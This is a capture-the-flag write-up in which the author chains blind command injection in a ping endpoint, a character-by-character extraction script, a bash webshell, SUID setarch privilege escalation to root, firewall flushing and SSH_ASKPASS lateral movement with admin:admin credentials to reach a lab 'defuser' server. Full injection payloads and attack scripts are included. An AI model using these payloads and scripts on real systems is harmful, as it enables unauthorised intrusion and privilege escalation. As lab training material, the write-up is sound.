# Operation SICKOMODE CTF

## CTF 
The goal of the CTF was to defuse a bomb by entering a provided code on the defuser website. Initial access was provided to the controller server at https://192.168.20.177.

## Initial Access and Scanning
After running an nmap scan and durbuster on 192.168.20.177, I found the "/development" URI. This website provided a text box that says "This bay does one thing: it pings a target and tells you if it’s alive. No extra diagnostics. No noise. Just signal."

When you enter something into the text field, it appears to use `/api/ping`, which sends a ping to the specified host and return whether the host is up or down.

```
GET /api/pulse?ip=127.0.0.1 HTTP/1.1
{"ok":true,"ip":"127.0.0.1","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":2,"checked_at":1773555009}
```

## Blind Command Injection
Since I had seen ping used in other CTFs as a vehicle for command injection, my first thought was to try payloads such as `; cat /etc/passwd`, `$(cat /etc/passwd)`, or `\`cat /etc/passwd\``

Unfortunately, all these commands seem to do was echo the command back to me and then say the host was down. However, after playing around a bit, I did notice an interesting pattern. Injected commands that seemed to be valid bash commands would return "Host Up" and commands that were invalid returned "Host down".

```
# Command 'which ping' returns "up":true
GET /api/pulse?ip=%3B%20which%20ping HTTP/1.1
{"ok":true,"ip":"; which ping","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":3,"checked_at":1773555353}
# Command 'which pong' returns "up":false
GET /api/pulse?ip=%3B%20which%20pong HTTP/1.1
{"ok":true,"ip":"; which pong","up":false,"rtt_ms":null,"reason":"no response","elapsed_ms":3,"checked_at":1773555419}
```

This tells me two things: 
1. The commands I run are likely being executed on the target system, I just can't see the results.
2. I can potentially use boolean inference to read the output of commands one character at a time.

Using AI to help, I wrote a bash script that took a command, piped it to base 64, took one character at a time in a for loop, and then iterated over all of the ASCII characters until the character was discovered. Up to 128 requests were made to the server for each base 64 character of output. I quickly realized this would not be a viable solution, especially because the server was implementing rate limiting.

```
[*] Starting binary search extraction for: whoami
{"ok":true,"ip":"; [ $(whoami | base64 -w 0 | cut -c 1 | tr -d '\\n' | od -An -tu1) -gt 63 ]","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":7,"checked_at":1773555566}
{"detail":"Slow down"}
```

Using a little guess and check, I determined the fastest time between requests without gettring `{"detail": "Slow down"}` was 0.6 seconds. I also worked in a binary search algorithm to bring the requests per character down to log(128)= maximum of 8 requests per character. It still wasn't ideal, but it was enough to uncover some additional information to make command execution easier.

Here is the full binary search script:
```
#!/bin/bash

TARGET_URL="https://192.168.20.177/api/pulse"
CMD_TO_EXTRACT="pwd"

echo "[*] Starting binary search extraction for: $CMD_TO_EXTRACT"
EXTRACTED_B64=""

# Base64 string can be long, adjust maximum range if needed
for (( i=1; i<=5000; i++ )); do
    LOW=0
    HIGH=127

    # Binary search loop (takes exactly 7 requests per character)
    while [ $LOW -lt $HIGH ]; do
        MID=$(( (LOW + HIGH) / 2 ))

        # Payload asks: Is the ASCII value of the $i-th character greater than $MID?
        # 'od -An -tu1' converts the single character into its decimal ASCII integer.
        PAYLOAD="; [ \$($CMD_TO_EXTRACT | base64 -w 0 | cut -c $i | tr -d '\n' | od -An -tu1) -gt $MID ]"

        RESPONSE=$(curl -s -k -G \
            -H 'Host: 192.168.17.176' \
            -H 'Sec-Ch-Ua-Platform: "Linux"' \
            -H 'Accept-Language: en-US,en;q=0.9' \
            -H 'Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"' \
            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' \
            -H 'Sec-Ch-Ua-Mobile: ?0' \
            -H 'Accept: */*' \
            -H 'Sec-Fetch-Site: same-origin' \
            -H 'Sec-Fetch-Mode: cors' \
            -H 'Sec-Fetch-Dest: empty' \
            -H 'Referer: https://192.168.17.176/development' \
            -H 'Accept-Encoding: gzip, deflate, br' \
            -H 'Connection: keep-alive' \
            --data-urlencode "ip=$PAYLOAD" \
            "$TARGET_URL")

        sleep 0.6

        # If the oracle returns success ("up":true), the ASCII value IS greater than MID
        if echo "$RESPONSE" | grep -q '"up":true' || echo "$RESPONSE" | grep -q '"up": true'; then
            LOW=$(( MID + 1 ))
        else
            HIGH=$MID
        fi
    done

    # If LOW resolves to 0, 'od' returned nothing, meaning we hit the end of the string
    if [ $LOW -eq 0 ]; then
        echo -e "\n[*] End of output reached."
        break
    fi

    # Convert the decimal ASCII value back into a character safely using octal
    OCTAL=$(printf '%03o' $LOW)
    CHAR=$(printf "\\$OCTAL")
```

Script output:
```
[*] Starting binary search extraction for: pwd
[+] Extracted Base64: L29wdC9jb250cm9sbGVyLXB1bHNlL2FwcAo=
[*] End of output reached.

[*] Decoding...

/opt/controller-pulse/app
```

## Web Shell

Using the script, I found my current working directory, and found that the file hosting the 'ping' website was located at /opt/controller-pulse/app/templates/development.html. Back on the website, I ran `; [ -w /opt/controller-pulse/app/templates/development.html ]` and it came back with "Host Up" which means the command executed successfully and I can write to the file. Using this I could start using the page as a webshell by appending the output of bash commands to the bottom of the HTML file. I wrote this simple webshell in bash, used base64 to upload it through the ping box, and called it /tmp/b on the target. 

```
#!/bin/bash

COMMAND=$*
HTMLFILE="/opt/controller-pulse/app/templates/development.html"
OUTPUT="[$(date)] WEBSHELL OUTPUT for '$COMMAND': $(/bin/bash -c $COMMAND) | base64 -w0)"
echo "$OUTPUT" >> "$HTMLFILE"
```

The script takes the output of a command, pipes it to base64 with some header information, and appends it to the end of the file. I could now run commands in the ping box like `;/tmp/b id`, refresh the page, and see the output at the bottom. I then just took the base64 output and decoded it on my local machine.

```
[Sun Mar 15 06:33:29 AM UTC 2026] WEBSHELL OUTPUT for 'id': dWlkPTk5NyhwdWxzZSkgZ2lkPTk5NihwdWxzZSkgZ3JvdXBzPTk5NihwdWxzZSkK
$ echo dWlkPTk5NyhwdWxzZSkgZ2lkPTk5NihwdWxzZSkgZ3JvdXBzPTk5NihwdWxzZSkK | base64 -d
uid=997(pulse) gid=996(pulse) groups=996(pulse)
```

I used this web shell to run some additional commands on the 'pulse' target. One command I ran was the standard find command to find SUID binaries. I found that `/usr/bin/setarch` had the SUID bit set, which is listed on the GTFObins webpage. I modified the web shell to run commands through setach, also using python's `os` library to ensure the UID and GUID of the processes I am running are root, not just the EUID and GUID.

```
#!/bin/bash

COMMAND=$*
HTMLFILE="/opt/controller-pulse/app/templates/development.html"
OUTPUT="[$(date)] WEBSHELL OUTPUT for '$COMMAND': $(/bin/bash -c "/usr/bin/setarch x86_64 python3 -c 'import os; os.setuid(0); os.setgid(0); os.system(\"$COMMAND\")'" | base64 -w0)"
echo "$OUTPUT" >> "$HTMLFILE"
```

```
Sun Mar 15 06:40:15 AM UTC 2026] WEBSHELL OUTPUT for 'id': dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksOTk2KHB1bHNlKQo=
$ echo dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksOTk2KHB1bHNlKQo= | base64 -d                                                 
uid=0(root) gid=0(root) groups=0(root),996(pulse)
```

## Lateral Movement to Defuse Server

As part of my enumeration on the "pulse" server, I found that the defuser server was listed in `/etc/hosts` as 10.60.20.74. I also found a note in a file called `/lazyadmin.txt` that said the following: 

> That lazy admin is always messing with binaries permissions,
> I swear here will be the reason for a major incident.
> Just this week he told me he has been logging into defuser with credentials admin:admin

Cool, so now I have the credentials and the IP address of the defuser host, I just need a way to login. My first thought was to ssh in, however, there was no SSH binary on the pulse target. It appears that it was deliberately removed. Additionally, there was a firewall rule blocking outbound ssh to defuser, but this was easy to get around now that I was root and could run `iptables -F`. 

I learned that curl can act as an SFTP client, and since the defuser had ssh open I could try connecting to it to enumerate and transfer files. Unfortunately, this would not help me get code execution on the remote machine as my credentials were for an unprivileged user that likely couldn't write to crontab, etc. directly. Eventually, I thought, why not just try to transfer the SFTP binary from the defuser to the pulse server.

```
; curl -k -o /tmp/ssh -u admin:admin sftp://10.60.20.74/usr/bin/ssh; chmod +x /tmp/ssh
```

So now I had an SSH binary on the pulse server and the firewall rules were clear, but I was still operating through the web shell which was prohibit me from getting an interactive shell on the defuser server.

I found out it is possible to bypass the need for a TTY to enter a password in SSH by setting the SSH_ASKPASS environment variable to the location of a script that prints the password. I created a script in /tmp/ap.sh on pulse that simply ran `echo admin`, and then was able to run commands on defuser through my web shell on pulse using the following format.

```
; env SSH_ASKPASS=/tmp/ap.sh DISPLAY=dummy:0 setsid /tmp/ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@10.60.20.74 "id" > /tmp/aa 2>/tmp/ee; /tmp/c cat /tmp/aa /tmp/ee
[Sun Mar 15 06:54:57 AM UTC 2026] WEBSHELL OUTPUT for 'cat /tmp/aa /tmp/ee': dWlkPTEwMDAoYWRtaW4pIGdpZD0xMDAwKGFkbWluKSBncm91cHM9MTAwMChhZG1pbikK
$ echo dWlkPTEwMDAoYWRtaW4pIGdpZD0xMDAwKGFkbWluKSBncm91cHM9MTAwMChhZG1pbikK | base64 -d
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

## Defusing the Bomb
Now that I had the ability to execute commands on the defuser host, all that was left was to figure out how to access the defuser website to defuse the bomb. I found the following lines in the admin's bash history:
```
sudo iptables -A INPUT -i lo -s 127.0.0.1 -p tcp --sport 46900 --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -o lo -d 127.0.0.1 -p tcp --sport 46900 --dport 80 -j ACCEPT
sudo iptables -A INPUT -i lo -d 127.0.0.1 -p tcp --dport 80 -j REJECT --reject-with tcp-reset
sudo iptables -A OUTPUT -o lo -d 127.0.0.1 -p tcp --dport 80 -j REJECT --reject-with tcp-reset
```

This tells me that they were only accepting connections to the webserver from localhost on a specific source port. After reading through the source code and finding a few additional checks that the website was doing in order to allow the defuser code to go through, I had AI help me write this python script in order to defuse the bomb.

```
import http.client as hc, json, hashlib as hl, urllib.parse as up, sys
c = hc.HTTPConnection("127.0.0.1", 80, source_address=("127.0.0.1", 46900))
u, o = "x", "http://127.0.0.1"
c.request("GET", "/", headers={"User-Agent": u})
n = c.getresponse().read().decode().split('"nonce": "')[1].split('"')[0]
p = hl.sha256(f"{n}::{u}::{o}::::".encode()).hexdigest()
c.request("POST", "/api/browser-session", body=json.dumps({"nonce":n,"proof":p,"origin":o,"screen":"","language":""}), headers={"User-Agent":u, "Content-Type":"application/json"})
k = c.getresponse().getheader("Set-Cookie").split(";")[0]
c.request("POST", "/submit", body=up.urlencode({"code": sys.argv[1]}), headers={"User-Agent":u, "Content-Type":"application/x-www-form-urlencoded", "Cookie":k})
print(c.getresponse().read().decode())
```

I base64 encoded it, uploaded it in chunks, and executed it. Unfortunately, I was too late to defuse the bomb, but I still had fun trying.

```
<div class="notice"><span class="bad">Failed:</span> <code>409</code> <code>{"detail":"Cannot defuse: EXPIRED"}</code></div>
```




